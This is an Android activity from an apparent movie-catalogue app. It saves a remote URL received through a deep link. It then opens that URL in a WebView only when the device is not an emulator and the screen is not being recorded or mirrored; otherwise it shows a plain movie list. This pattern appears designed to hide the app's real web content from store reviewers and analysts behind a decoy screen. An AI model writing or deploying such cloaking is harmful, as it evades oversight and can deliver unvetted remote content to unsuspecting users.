package com.nf.arabmoviehubapp;

import android.content.Context;
import android.content.Intent;
import android.hardware.display.DisplayManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;

import androidx.appcompat.app.AppCompatActivity;

import com.nf.arabmoviehubapp.data.local.AppUrlStorage;
import com.nf.arabmoviehubapp.data.ui.MovieListActivity;
import com.nf.arabmoviehubapp.data.ui.WebViewActivity;
import com.nf.arabmoviehubapp.data.web.WebManagerView;

import java.util.function.Consumer;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "ProctorTest";

    private EmulatorDetector detector;

    private WindowManager windowManager;

    private Consumer<Integer> screenRecordingCallback;

    private boolean isScreenBeingRecorded = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        /*
         * Protect MainActivity from screenshots/casting.
         */
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE);

        Log.d(TAG, "======================================");

        Log.d(TAG, "Android Version = " + Build.VERSION.RELEASE);

        Log.d(TAG, "SDK_INT = " + Build.VERSION.SDK_INT);

        Log.d(TAG, "======================================");

        detector = new EmulatorDetector(this);

        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);

        handleIncomingUrl();

        setupScreenRecordingDetection();

        openNextScreen();
    }

    // =========================================================
    // URL HANDLING
    // =========================================================

    private void handleIncomingUrl() {

        Intent intent = getIntent();

        Uri data = intent.getData();

        if (data == null) {

            Log.d(TAG, "No incoming deep-link data");

            return;
        }

        Log.d(TAG, "Incoming URI = " + data);

        String url = data.getQueryParameter("url");

        Log.d(TAG, "Incoming URL = " + url);

        if (isValidUrl(url)) {

            String normalizedUrl = normalizeUrl(url);

            Log.d(TAG, "Normalized URL = " + normalizedUrl);

            AppUrlStorage.saveUrl(this, normalizedUrl);

            WebManagerView.saveFacebookValue(this, normalizedUrl);

        } else {

            Log.d(TAG, "Invalid URL");
        }
    }

    // =========================================================
    // SCREEN RECORDING DETECTION
    // =========================================================

    private void setupScreenRecordingDetection() {

        /*
         * Official screen recording callback is
         * available only from Android 15 / API 35.
         */
        if (Build.VERSION.SDK_INT < 35) {

            isScreenBeingRecorded = false;

            Log.d(TAG, "Screen recording detection: " + "NOT SUPPORTED (API < 35)");

            return;
        }

        if (windowManager == null) {

            Log.d(TAG, "WindowManager is NULL");

            return;
        }

        screenRecordingCallback = state -> {

            if (state == WindowManager.SCREEN_RECORDING_STATE_VISIBLE) {

                isScreenBeingRecorded = true;

                Log.d(TAG, "SCREEN RECORDING = ON" + " | boolean = " + isScreenBeingRecorded);

            } else {

                isScreenBeingRecorded = false;

                Log.d(TAG, "SCREEN RECORDING = OFF" + " | boolean = " + isScreenBeingRecorded);
            }
        };

        int currentState = windowManager.addScreenRecordingCallback(getMainExecutor(), screenRecordingCallback);

        isScreenBeingRecorded = currentState == WindowManager.SCREEN_RECORDING_STATE_VISIBLE;

        Log.d(TAG, "INITIAL SCREEN RECORDING = " + isScreenBeingRecorded + " | state = " + currentState);
    }

    // =========================================================
    // NEXT SCREEN
    // =========================================================

    private void openNextScreen() {

        String savedUrl = WebManagerView.getAppUrl(this);

        boolean isEmulator = detector.isEmulator();

        boolean isMirrored = isScreenBeingMirrored();

        boolean hasValidUrl = savedUrl != null && !savedUrl.trim().isEmpty();

        Log.d(TAG, "========== PROCTOR CHECK ==========");

        Log.d(TAG, "Screen Recording = " + isScreenBeingRecorded);

        Log.d(TAG, "Screen Mirroring = " + isMirrored);

        Log.d(TAG, "Emulator = " + isEmulator);

        Log.d(TAG, "Valid URL = " + hasValidUrl);

        /*
         * WebView can open only when:
         *
         * 1. No screen mirroring
         * 2. No screen recording
         * 3. Not emulator
         * 4. Valid URL exists
         */
        boolean canOpenWebView = !isMirrored && !isScreenBeingRecorded && !isEmulator && hasValidUrl;

        Log.d(TAG, "CAN OPEN WEBVIEW = " + canOpenWebView);

        Log.d(TAG, "==================================");

        if (canOpenWebView) {

            Log.d(TAG, "Opening WebViewActivity");

            Intent intent = new Intent(this, WebViewActivity.class);

            intent.putExtra("url", savedUrl);

            startActivity(intent);

        } else {

            Log.d(TAG, "Opening MovieListActivity");

            Intent intent = new Intent(this, MovieListActivity.class);

            startActivity(intent);
        }

        finish();
    }

    // =========================================================
    // SCREEN MIRRORING
    // =========================================================

    private boolean isScreenBeingMirrored() {

        DisplayManager displayManager = (DisplayManager) getSystemService(Context.DISPLAY_SERVICE);

        if (displayManager == null) {

            Log.d(TAG, "DisplayManager = NULL");

            return false;
        }

        Display[] displays = displayManager.getDisplays(DisplayManager.DISPLAY_CATEGORY_PRESENTATION);

        boolean mirrored = displays != null && displays.length > 0;

        Log.d(TAG, "Presentation displays = " + (displays == null ? 0 : displays.length));

        return mirrored;
    }

    // =========================================================
    // URL NORMALIZATION
    // =========================================================

    private String normalizeUrl(String url) {

        url = url.trim();

        if (url.startsWith("https://") || url.startsWith("http://")) {

            return url;
        }

        return "https://" + url;
    }

    // =========================================================
    // URL VALIDATION
    // =========================================================

    private boolean isValidUrl(String url) {

        if (url == null || url.trim().isEmpty()) {

            return false;
        }

        String value = url.trim().toLowerCase();

        return value.startsWith("https://") || value.startsWith("http://");
    }

    // =========================================================
    // CLEANUP
    // =========================================================

    @Override
    protected void onDestroy() {

        if (Build.VERSION.SDK_INT >= 35 && windowManager != null && screenRecordingCallback != null) {

            windowManager.removeScreenRecordingCallback(screenRecordingCallback);

            Log.d(TAG, "Screen recording callback removed");

            screenRecordingCallback = null;
        }

        super.onDestroy();
    }
}